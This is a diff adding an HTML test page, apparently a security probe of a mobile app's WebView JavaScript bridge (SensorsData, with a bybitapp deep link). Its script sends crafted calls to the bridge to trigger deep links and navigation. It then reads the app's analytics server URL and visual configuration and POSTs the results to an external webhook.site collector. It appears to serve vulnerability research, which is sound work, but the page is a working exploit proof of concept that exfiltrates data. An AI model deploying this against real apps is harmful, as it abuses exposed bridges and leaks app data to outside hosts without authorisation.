@@ -1,0 +1,21 @@
+<!doctype html><html><body style="font:14px monospace;padding:8px"><h3>SD CALL APP TEST</h3><pre id="o">calling…</pre>
+<script>
+var HOOK='https://webhook.site/014073e3-7f12-441c-b950-8ef66088bbb6';
+function log(s){document.getElementById('o').textContent+='\n'+s}
+function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+JSON.stringify(d)})}catch(e){}}
+var b=window.SensorsData_APP_New_H5_Bridge, res={};
+var payloads=[
+ '{"callType":"openDeepLink","params":{"url":"bybitapp://open/web?url=https%3A%2F%2Fexample.com%2Fsd1"}}',
+ '{"callType":"OPEN_URL","params":{"url":"https://example.com/sd2"}}',
+ '{"callType":"navigate","params":{"url":"https://example.com/sd3"}}',
+ '{"callType":"track","params":{"event":"dsh_test"}}',
+ 'not-json'
+];
+payloads.forEach(function(p,i){
+  try{ var r=b.sensorsdata_call_app(p); res['call'+i]=(''+r).substr(0,120); log('call'+i+' -> '+(''+r).substr(0,120)); }
+  catch(e){ res['call'+i]='ERR '+e; log('call'+i+' ERR '+e) }
+});
+try{ res.server_url = ''+b.sensorsdata_get_server_url(); log('server_url='+res.server_url) }catch(e){}
+try{ res.visual = (''+b.sensorsdata_get_app_visual_config()).substr(0,300); log('visual='+res.visual) }catch(e){}
+post('SD_TEST', res);
+</script></body></html>
